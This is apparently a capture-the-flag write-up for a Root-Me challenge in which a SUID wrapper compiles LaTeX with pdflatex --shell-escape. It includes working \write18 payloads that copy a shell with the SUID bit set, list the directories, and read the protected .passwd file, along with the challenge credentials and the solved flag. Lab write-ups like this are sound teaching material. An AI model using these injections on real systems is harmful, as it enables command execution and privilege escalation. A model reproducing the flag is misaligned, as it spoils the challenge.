# Latex Command Execution

URL: [https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution)

## Statement

Execute commands to find the flag !
## Source code

```bash
#!/usr/bin/env bash
 
if [[ $# -ne 1 ]]; then
    echo "Usage : ${0} TEX_FILE"
fi
 
if [[ -f "${1}" ]]; then
    TMP=$(mktemp -d)
    cp "${1}" "${TMP}/main.tex"
 
    # Compilation
    echo "[+] Compilation ..."
    timeout 5 /usr/bin/pdflatex \
        -halt-on-error \
        -output-format=pdf \
        -output-directory "${TMP}" \
        --shell-escape \
        "${TMP}/main.tex" > /dev/null
 
    timeout 5 /usr/bin/pdflatex \
        -halt-on-error \
        -output-format=pdf \
        -output-directory "${TMP}" \
        --shell-escape \
        "${TMP}/main.tex" > /dev/null
 
    chmod u+w "${TMP}/main.tex"
    rm "${TMP}/main.tex"
    chmod 750 -R "${TMP}"
    if [[ -f "${TMP}/main.pdf" ]]; then
        echo "[+] Output file : ${TMP}/main.pdf"
    else
        echo "[!] Compilation error, your logs : ${TMP}/main.log"
    fi
else
    echo "[!] Can't access file ${1}"
fi
```

[Download](https://www.root-me.org/local/cache-code/780529092555806d84ab7a9a27b0ae7c.txt)
## Challenge connection information

| Key        | Value                                                                                                                                                                                                                                                                                                                                 |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Host       | challenge02.root-me.org                                                                                                                                                                                                                                                                                                               |
| Protocol   | SSH                                                                                                                                                                                                                                                                                                                                   |
| Port       | 2222                                                                                                                                                                                                                                                                                                                                  |
| SSH access | [ssh -p 2222 app-script-ch24@challenge02.root-me.org](ssh://app-script-ch24:app-script-ch24@challenge02.root-me.org:2222 "SSH access")     [![](https://www.root-me.org/squelettes/img/webssh.png?1454749832) WebSSH](http://webssh.root-me.org/?location=WebSSH_2846&ssh=ssh://app-script-ch24:app-script-ch24@challenge02 "WebSSH") |
| Username   | app-script-ch24                                                                                                                                                                                                                                                                                                                       |
| Password   | app-script-ch24                                                                                                                                                                                                                                                                                                                       |
## Solution

GTFOBins [pdflatex](https://gtfobins.github.io/gtfobins/pdflatex/) 

Because `pdflatex` is using `--shell-escape` option we can achieve RCE:

For some reason giving SUID bit to copied `bash` didn't preserve the permissions 
```bash
app-script-ch24@challenge02:/challenge/app-script/ch24$ echo '\documentclass{article}\begin{document}\immediate\write18{cp /bin/sh /tmp/bash && chmod 4777 /tmp/bash}\end{document}' > /tmp/ch24
app-script-ch24@challenge02:/challenge/app-script/ch24$ ./setuid-wrapper /tmp/ch24
[+] Compilation ...
[!] Compilation error, your logs : /tmp/tmp.wOVWLuSRfY/main.log
app-script-ch24@challenge02:/challenge/app-script/ch24$ ls -alh /tmp/bash
-rwsrwxrwx 1 app-script-ch24-cracked app-script-ch24 126K Aug 21 17:15 /tmp/bash
app-script-ch24@challenge02:/challenge/app-script/ch24$ /tmp/bash -p
$ id
uid=1523(app-script-ch24) gid=1523(app-script-ch24) groups=1523(app-script-ch24),100(users)
$ exit
```

Enumerate the directory
```bash
app-script-ch24@challenge02:/challenge/app-script/ch24$ echo '\documentclass{article}\begin{document}\immediate\write18{ls -alhR /challenge/app-script/ch24 > /tmp/ch24out}\end{document}' > /tmp/ch24
app-script-ch24@challenge02:/challenge/app-script/ch24$ ./setuid-wrapper /tmp/ch24
[+] Compilation ...
[!] Compilation error, your logs : /tmp/tmp.Su6vDpwrQH/main.log
app-script-ch24@challenge02:/challenge/app-script/ch24$ cat /tmp/ch24out
/challenge/app-script/ch24:
total 676K
drwxr-x---  3 app-script-ch24-cracked app-script-ch24 4.0K Dec 10  2021 .
drwxr-xr-x 25 root                    root            4.0K Sep  5  2023 ..
-r--------  1 root                    root            1.2K Dec 10  2021 ._perms
-rw-r-----  1 root                    root              43 Dec 10  2021 .git
-r-xr-x---  1 app-script-ch24-cracked app-script-ch24  889 Dec 10  2021 ch24.sh
drwx--x---  3 app-script-ch24-cracked app-script-ch24 4.0K Dec 10  2021 flag_is_here
-rwsr-x---  1 app-script-ch24-cracked app-script-ch24 647K Dec 10  2021 setuid-wrapper
-r--r-----  1 app-script-ch24-cracked app-script-ch24  262 Dec 10  2021 setuid-wrapper.c

/challenge/app-script/ch24/flag_is_here:
total 12K
drwx--x--- 3 app-script-ch24-cracked app-script-ch24 4.0K Dec 10  2021 .
drwxr-x--- 3 app-script-ch24-cracked app-script-ch24 4.0K Dec 10  2021 ..
drwxr-x--- 2 app-script-ch24-cracked app-script-ch24 4.0K Dec 10  2021 512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6

/challenge/app-script/ch24/flag_is_here/512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6:
total 12K
drwxr-x--- 2 app-script-ch24-cracked app-script-ch24         4.0K Dec 10  2021 .
drwx--x--- 3 app-script-ch24-cracked app-script-ch24         4.0K Dec 10  2021 ..
-r-------- 1 app-script-ch24-cracked app-script-ch24-cracked   42 Dec 10  2021 .passwd
```

Read the flag:
```bash
app-script-ch24@challenge02:/challenge/app-script/ch24$ echo '\documentclass{article}\begin{document}\immediate\write18{cat /challenge/app-script/ch24/flag_is_here/512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6/.passwd > /tmp/ch24out}\end{document}' > /tmp/ch24
app-script-ch24@challenge02:/challenge/app-script/ch24$ ./setuid-wrapper /tmp/ch24
[+] Compilation ...
[!] Compilation error, your logs : /tmp/tmp.3k61avI6Lw/main.log
app-script-ch24@challenge02:/challenge/app-script/ch24$ cat /tmp/ch24out
LaTeX_wr1t3_18_a_us3ful_c0mm4nd_3x3cut10n
```

::: tip Flag
`LaTeX_wr1t3_18_a_us3ful_c0mm4nd_3x3cut10n`
:::